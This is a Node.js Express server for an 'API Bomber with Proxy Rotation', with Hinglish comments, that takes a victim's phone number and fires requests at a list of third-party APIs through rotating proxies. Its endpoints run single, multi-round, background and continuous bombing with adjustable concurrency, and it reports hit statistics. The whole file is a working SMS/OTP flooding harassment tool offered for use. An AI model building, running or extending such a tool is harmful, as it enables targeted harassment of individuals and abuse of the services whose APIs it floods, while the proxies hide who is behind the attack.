// server.js - Main Server File (Port 10000)
// Har API ek saath hit karega with random proxy rotation

const express = require('express');
const { bombAll, continuousBomb, stats, hitAPI } = require('./bomber');
const APIS = require('./apis');
const { PROXIES } = require('./proxies');

const app = express();
const PORT = 10000;

// ═══════════════════════════════════════════════════════════════
// MIDDLEWARE
// ═══════════════════════════════════════════════════════════════

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// CORS Headers
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Request Logger
app.use((req, res, next) => {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] ${req.method} ${req.url} | IP: ${req.ip}`);
  next();
});

// ═══════════════════════════════════════════════════════════════
// ROUTES
// ═══════════════════════════════════════════════════════════════

// ─────────────────────────────────────────────────────────────
// 1. HOME / HEALTH CHECK
// ─────────────────────────────────────────────────────────────
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    service: '🔥 API Bomber with Proxy Rotation',
    version: '1.0.0',
    port: PORT,
    totalAPIs: APIS.length,
    totalProxies: PROXIES.length,
    uptime: process.uptime() + ' seconds',
    endpoints: {
      'Bomb (1 round)': '/bomb?phone=9876543210',
      'Bomb (multi round)': '/bomb?phone=9876543210&rounds=10&delay=2000',
      'Bomb (async)': '/bomb?phone=9876543210&async=true',
      'Continuous': '/bomb/continuous?phone=9876543210&rounds=5',
      'Stats': '/stats',
      'List APIs': '/apis',
      'List Proxies': '/proxies',
      'Test Single API': '/test?api=1&phone=9876543210'
    },
    usage: 'GET /bomb?phone=NUMBER'
  });
});

// ─────────────────────────────────────────────────────────────
// 2. MAIN BOMB ENDPOINT (MAIN!)
// ─────────────────────────────────────────────────────────────
app.get('/bomb', async (req, res) => {
  const phone = req.query.phone;
  const rounds = parseInt(req.query.rounds) || 1;
  const delay = parseInt(req.query.delay) || 2000;
  const concurrency = parseInt(req.query.concurrency) || 50;
  const asyncMode = req.query.async === 'true';

  // ──────── Validate Phone ────────
  if (!phone) {
    return res.status(400).json({
      success: false,
      error: 'Phone number required',
      usage: '/bomb?phone=9876543210',
      examples: [
        '/bomb?phone=9876543210',
        '/bomb?phone=9876543210&rounds=10&delay=2000',
        '/bomb?phone=9876543210&async=true'
      ]
    });
  }

  // ──────── Clean Phone Number ────────
  const cleanPhone = phone.replace(/[^0-9]/g, '');

  if (cleanPhone.length < 10 || cleanPhone.length > 15) {
    return res.status(400).json({
      success: false,
      error: 'Invalid phone number',
      message: 'Phone must be 10-15 digits',
      received: cleanPhone,
      length: cleanPhone.length
    });
  }

  // ──────── Log Request ────────
  console.log(`\n${'═'.repeat(60)}`);
  console.log(`🔥 BOMB REQUEST`);
  console.log(`${'═'.repeat(60)}`);
  console.log(`📱 Phone: ${cleanPhone}`);
  console.log(`🔁 Rounds: ${rounds}`);
  console.log(`⏱️  Delay: ${delay}ms`);
  console.log(`⚡ Concurrency: ${concurrency}`);
  console.log(`🔄 Async: ${asyncMode}`);
  console.log(`📊 Total APIs: ${APIS.length}`);
  console.log(`🔀 Total Proxies: ${PROXIES.length}`);
  console.log(`${'═'.repeat(60)}\n`);

  // ──────── Async Mode (Background) ────────
  if (asyncMode) {
    res.json({
      success: true,
      status: 'started',
      mode: 'async',
      phone: cleanPhone,
      rounds: rounds,
      totalAPIs: APIS.length,
      totalProxies: PROXIES.length,
      message: '🚀 Bombing started in background. Check /stats for progress.'
    });

    // Run in background
    (async () => {
      try {
        if (rounds > 1) {
          await continuousBomb(cleanPhone, rounds, delay, concurrency);
        } else {
          await bombAll(cleanPhone, concurrency);
        }
      } catch (err) {
        console.error('Background bomb error:', err);
      }
    })();
    return;
  }

  // ──────── Sync Mode (Wait for completion) ────────
  try {
    let result;

    if (rounds > 1) {
      const allResults = await continuousBomb(cleanPhone, rounds, delay, concurrency);

      const totalHits = allResults.reduce((sum, r) => sum + r.stats.total, 0);
      const totalSuccess = allResults.reduce((sum, r) => sum + r.stats.success, 0);
      const totalFailed = allResults.reduce((sum, r) => sum + r.stats.failed, 0);

      res.json({
        success: true,
        status: 'complete',
        mode: 'sync-multi-round',
        phone: cleanPhone,
        rounds: rounds,
        summary: {
          totalHits,
          totalSuccess,
          totalFailed,
          successRate: `${((totalSuccess / totalHits) * 100).toFixed(2)}%`
        },
        roundResults: allResults.map((r, i) => ({
          round: i + 1,
          ...r.stats
        }))
      });
    } else {
      result = await bombAll(cleanPhone, concurrency);

      res.json({
        success: true,
        status: 'complete',
        mode: 'sync-single-round',
        phone: cleanPhone,
        ...result.stats,
        successRate: `${((result.stats.success / result.stats.total) * 100).toFixed(2)}%`,
        failedDetails: result.failedResults || []
      });
    }
  } catch (error) {
    console.error('❌ Bomb error:', error);
    res.status(500).json({
      success: false,
      error: 'Bombing failed',
      message: error.message,
      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
    });
  }
});

// ─────────────────────────────────────────────────────────────
// 3. CONTINUOUS BOMB ENDPOINT
// ─────────────────────────────────────────────────────────────
app.get('/bomb/continuous', async (req, res) => {
  const phone = req.query.phone;
  const rounds = parseInt(req.query.rounds) || 5;
  const delay = parseInt(req.query.delay) || 2000;
  const concurrency = parseInt(req.query.concurrency) || 50;

  if (!phone) {
    return res.status(400).json({
      success: false,
      error: 'Phone number required',
      usage: '/bomb/continuous?phone=9876543210&rounds=5&delay=2000'
    });
  }

  const cleanPhone = phone.replace(/[^0-9]/g, '');

  if (cleanPhone.length < 10) {
    return res.status(400).json({
      success: false,
      error: 'Invalid phone number'
    });
  }

  res.json({
    success: true,
    status: 'started',
    mode: 'continuous',
    phone: cleanPhone,
    rounds: rounds,
    delay: delay,
    concurrency: concurrency,
    totalAPIs: APIS.length,
    message: '🔄 Continuous bombing started in background. Check /stats for progress.'
  });

  // Run in background
  continuousBomb(cleanPhone, rounds, delay, concurrency).catch(console.error);
});

// ─────────────────────────────────────────────────────────────
// 4. STATS ENDPOINT
// ─────────────────────────────────────────────────────────────
app.get('/stats', (req, res) => {
  res.json({
    success: true,
    stats: {
      ...stats,
      totalAPIs: APIS.length,
      totalProxies: PROXIES.length,
      uptime: process.uptime() + ' seconds',
      memoryUsage: process.memoryUsage()
    }
  });
});

// ─────────────────────────────────────────────────────────────
// 5. LIST ALL APIS
// ─────────────────────────────────────────────────────────────
app.get('/apis', (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = parseInt(req.query.limit) || 50;
  const category = req.query.category;

  let filteredAPIs = APIS;

  // Filter by category
  if (category) {
    filteredAPIs = APIS.filter(api => 
      api.name.toLowerCase().includes(category.toLowerCase())
    );
  }

  const start = (page - 1) * limit;
  const end = start + limit;
  const paginatedAPIs = filteredAPIs.slice(start, end);

  res.json({
    success: true,
    total: APIS.length,
    filtered: filteredAPIs.length,
    page: page,
    limit: limit,
    totalPages: Math.ceil(filteredAPIs.length / limit),
    apis: paginatedAPIs.map((api, index) => ({
      id: start + index + 1,
      name: api.name,
      url: api.url,
      method: api.method,
      hasHeaders: Object.keys(api.headers || {}).length > 0
    }))
  });
});

// ─────────────────────────────────────────────────────────────
// 6. LIST ALL PROXIES
// ─────────────────────────────────────────────────────────────
app.get('/proxies', (req, res) => {
  res.json({
    success: true,
    total: PROXIES.length,
    proxies: PROXIES
  });
});

// ─────────────────────────────────────────────────────────────
// 7. TEST SINGLE API
// ─────────────────────────────────────────────────────────────
app.get('/test', async (req, res) => {
  const { api, phone } = req.query;

  if (!phone) {
    return res.status(400).json({
      success: false,
      error: 'Phone required',
      usage: '/test?api=1&phone=9876543210'
    });
  }

  const apiIndex = parseInt(api) - 1;

  if (isNaN(apiIndex) || apiIndex < 0 || apiIndex >= APIS.length) {
    return res.status(400).json({
      success: false,
      error: 'Invalid API index',
      max: APIS.length,
      usage: `/test?api=1&phone=9876543210`
    });
  }

  const cleanPhone = phone.replace(/[^0-9]/g, '');

  try {
    const result = await hitAPI(APIS[apiIndex], cleanPhone);
    res.json({
      success: true,
      api: {
        id: apiIndex + 1,
        name: APIS[apiIndex].name,
        url: APIS[apiIndex].url,
        method: APIS[apiIndex].method
      },
      result: result
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// ─────────────────────────────────────────────────────────────
// 8. GET SINGLE API DETAILS
// ─────────────────────────────────────────────────────────────
app.get('/api/:id', (req, res) => {
  const apiIndex = parseInt(req.params.id) - 1;

  if (isNaN(apiIndex) || apiIndex < 0 || apiIndex >= APIS.length) {
    return res.status(404).json({
      success: false,
      error: 'API not found',
      validRange: `1 - ${APIS.length}`
    });
  }

  const api = APIS[apiIndex];
  res.json({
    success: true,
    api: {
      id: apiIndex + 1,
      name: api.name,
      url: api.url,
      method: api.method,
      headers: api.headers
    }
  });
});

// ─────────────────────────────────────────────────────────────
// 9. 404 HANDLER
// ─────────────────────────────────────────────────────────────
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    path: req.url,
    method: req.method,
    availableEndpoints: [
      'GET /',
      'GET /bomb?phone=NUMBER',
      'GET /bomb/continuous?phone=NUMBER&rounds=5',
      'GET /stats',
      'GET /apis',
      'GET /proxies',
      'GET /test?api=1&phone=NUMBER',
      'GET /api/:id'
    ]
  });
});

// ─────────────────────────────────────────────────────────────
// 10. ERROR HANDLER
// ─────────────────────────────────────────────────────────────
app.use((err, req, res, next) => {
  console.error('❌ Server error:', err);
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    message: err.message
  });
});

// ═══════════════════════════════════════════════════════════════
// START SERVER
// ═══════════════════════════════════════════════════════════════

const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   🔥  API BOMBER WITH PROXY ROTATION  🔥                      ║
║                                                               ║
║   Status     : ✅ ONLINE                                      ║
║   Port       : ${PORT}                                        ║
║   Total APIs : ${APIS.length.toString().padEnd(46)}║
║   Proxies    : ${PROXIES.length.toString().padEnd(46)}║
║                                                               ║
║   🌐 ENDPOINTS:                                               ║
║   ─────────────────────────────────────────────               ║
║   • GET /bomb?phone=9876543210                                ║
║   • GET /bomb?phone=9876543210&rounds=10&delay=2000           ║
║   • GET /bomb?phone=9876543210&async=true                     ║
║   • GET /bomb/continuous?phone=9876543210&rounds=5            ║
║   • GET /stats                                                ║
║   • GET /apis                                                 ║
║   • GET /proxies                                              ║
║   • GET /test?api=1&phone=9876543210                          ║
║   • GET /api/:id                                              ║
║                                                               ║
║   🎯 Ready to bomb!                                           ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
  `);
});

// ─────────────────────────────────────────────────────────────
// GRACEFUL SHUTDOWN
// ─────────────────────────────────────────────────────────────
process.on('SIGTERM', () => {
  console.log('\n⚠️  SIGTERM received. Shutting down gracefully...');
  server.close(() => {
    console.log('✅ Server closed.');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('\n⚠️  SIGINT received. Shutting down gracefully...');
  server.close(() => {
    console.log('✅ Server closed.');
    process.exit(0);
  });
});

process.on('uncaughtException', (err) => {
  console.error('❌ Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
});

module.exports = app;